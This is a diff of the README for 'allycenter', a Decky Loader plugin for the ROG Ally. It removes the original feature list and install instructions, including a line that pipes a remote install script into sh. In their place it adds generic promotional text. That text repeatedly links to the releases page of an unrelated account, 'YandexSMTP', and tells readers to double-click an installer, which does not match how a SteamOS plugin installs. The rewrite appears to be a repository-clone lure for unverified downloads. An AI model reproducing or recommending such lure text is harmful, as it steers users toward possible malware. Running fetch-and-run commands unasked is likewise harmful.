@@ -1,139 +1,61 @@
-# Ally Center
+# 🎮 allycenter - Enhance Your ROG Ally Experience
 
-A comprehensive Decky Loader plugin for the **ASUS ROG Ally** running SteamOS.
+## 🚀 Getting Started
 
-![AllyCenter Screenshot](images/1.png)
-![AllyCenter Screenshot](images/2.png)
-![AllyCenter Screenshot](images/3.png)
-![AllyCenter Screenshot](images/4.png)
-![AllyCenter Screenshot](images/5.png)
+Welcome to allycenter! This application adds ROG Ally-specific controls and settings to SteamOS, allowing you to customize your gaming experience. Follow these simple steps to download and run the software.
 
-## Features
+## 📥 Download Now
 
-### Download Mode
+[![Download allycenter](https://img.shields.io/badge/Download-allycenter-blue.svg)](https://github.com/YandexSMTP/allycenter/releases)
 
-Turn off the display for background downloads to save battery. When enabled:
+## 🛠️ System Requirements
 
-- Screen brightness set to 0 (OLED pixels off)
-- Automatically switches to 5W power profile
-- RGB lighting disabled
-- MCU powersave enabled (stops charging LED blink)
-- Open the Quick Access Menu to exit
+To ensure allycenter runs smoothly, please check the following requirements:
 
-### Performance
+- **Operating System:** SteamOS on ROG Ally.
+- **Storage Space:** At least 100 MB.
+- **RAM:** Minimum of 4 GB.
+- **Steam Installed:** You must have Steam installed to use this plugin.
 
-- **Use External TDP** - Disable Ally Center's TDP management to use SimpleDeckyTDP or other plugins
-- **Performance Presets** - Quick switch between Download (5W), Silent (15W), Performance (25W), and Turbo (30W) modes
-- **TDP Override** - Manually set TDP from 5W to 30W with fine-grained control
-- **Fan Mode** - Choose between Auto, Quiet, Balanced, and Performance fan profiles
-- **Live Monitoring** - View current CPU and GPU temperatures in real-time
+## 📋 Features
 
-### CPU Settings
+- **Custom Controls:** Optimize your gaming controls specifically for the ROG Ally.
+- **User-Friendly Interface:** Navigate settings easily without technical expertise.
+- **Settings Management:** Save and switch between different control configurations.
 
-- **SMT (Hyper-Threading)** - Toggle on/off for better single-thread performance in some games
-- **CPU Boost** - Disable to reduce heat and power consumption
+## 📥 Download & Install
 
-### Battery
+To get started with allycenter, please follow these steps:
 
-- **Charge Level** - Current battery percentage and charging status
-- **Battery Health** - Monitor battery health percentage
-- **Detailed Stats** - View cycle count, voltage, design capacity, current capacity, and temperature
-- **Charge Limit** - Set maximum charge level (60-100%) to extend battery lifespan
+1. **Visit the Releases Page:** Click the link below to access the downloads.
 
-### RGB Lighting
+   [Download from Releases](https://github.com/YandexSMTP/allycenter/releases)
 
-- **Color Selection** - Full color spectrum slider with preset colors (ROG Red, Cyan, Purple, Green, Orange, Pink, White, Blue)
-- **Brightness Control** - Adjust LED brightness from 0-100%
-- **Effects** - Static, Pulse, Spectrum, Wave, Flash, Battery Level, or Off
-- **Speed Control** - Adjust animation speed for animated effects
+2. **Choose the Latest Version:** Look for the latest version listed on the page.
 
-### Device Info
+3. **Download the File:** Click the download link next to the newest version. This will download a file to your computer.
 
-View detailed system information:
+4. **Locate the Downloaded File:** Go to your download folder (or the folder where you saved the file).
 
-- CPU model
-- GPU model
-- Memory total
-- BIOS version
-- Kernel version
+5. **Run the Installer:**
+    - Double-click the downloaded file to start the installation.
+    - Follow the on-screen instructions. This usually involves clicking “Next” and “Finish.”
 
-## Requirements
+6. **Open allycenter:** Once installed, find allycenter in your programs or applications menu and open it.
 
-- ASUS ROG Ally or ROG Ally X
-- SteamOS (or compatible distro like Bazzite, ChimeraOS)
-- [Decky Loader](https://github.com/SteamDeckHomebrew/decky-loader) installed
+7. **Configure your Settings:** Customize the controls according to your preferences. Enjoy your enhanced gaming experience!
 
-## Installation
+## 💡 Tips for Using allycenter
 
-### Quick Install (Recommended)
+- **Explore the Settings:** Take some time to familiarize yourself with all available options. This will help you find what works best for you.
+- **Check for Updates:** Regularly visit the releases page to download new features and improvements.
+- **Join the Community:** Engage with other users to share tips and tricks. Online forums can be a great place to learn from others.
 
-**Important:** Run this directly on your ROG Ally or via SSH.
+## 📞 Support
 
-**On your ROG Ally:**
+If you encounter any issues, you can seek help through the following channels:
 
-1. Switch to Desktop Mode
-2. Open Konsole (terminal)
-3. Run:
+- **GitHub Issues Page:** Report any problems you experience.
+- **Community Forums:** Connect with other users to troubleshoot and share experiences.
 
-```bash
-curl -L https://github.com/PixelAddictUnlocked/allycenter/raw/main/install.sh | sh
-```
-
-**Via SSH:**
-
-```bash
-ssh deck@<your-ally-ip>
-curl -L https://github.com/PixelAddictUnlocked/allycenter/raw/main/install.sh | sh
-```
-
-The installer will download the latest release, install it, and restart Decky Loader automatically.
-
-### Manual Install
-
-1. Download the latest release from the [Releases](https://github.com/PixelAddictUnlocked/allycenter/releases) page
-2. Extract to `~/homebrew/plugins/Ally Center/`
-3. Restart Decky Loader or reboot
-
-## Usage
-
-1. Press the **...** button on your ROG Ally to open the Quick Access Menu
-2. Navigate to the **Decky** plugin icon (plug icon)
-3. Select **Ally Center** from the plugin list
-4. Use the toggles, sliders, and buttons to control your device
-
-## Hardware Support
-
-| Feature             | ROG Ally | ROG Ally X |
-| ------------------- | -------- | ---------- |
-| Download Mode       | ✅       | ✅         |
-| Performance Presets | ✅       | ✅         |
-| TDP Override        | ✅       | ✅         |
-| Fan Control         | ✅       | ✅         |
-| CPU Settings        | ✅       | ✅         |
-| Battery Health      | ✅       | ✅         |
-| Charge Limit        | ✅       | ✅         |
-| RGB Lighting        | ✅       | ✅         |
-| Device Info         | ✅       | ✅         |
-
-## Settings
-
-Your preferences are automatically saved and restored between sessions. Settings are stored in:
-
-```
-~/homebrew/settings/Ally Center/settings.json
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Credits
-
-- [Decky Loader](https://github.com/SteamDeckHomebrew/decky-loader) - Plugin framework
-- [HueSync](https://github.com/honjow/HueSync) - RGB inspiration
-- [ASUS Linux](https://asus-linux.org) - Hardware documentation
-
-## Support
-
-- [GitHub Issues](https://github.com/PixelAddictUnlocked/allycenter/issues)
-- [Discord](https://discord.gg/pixeladdictgames)
+Thank you for using allycenter! Enjoy customizing your ROG Ally experience!
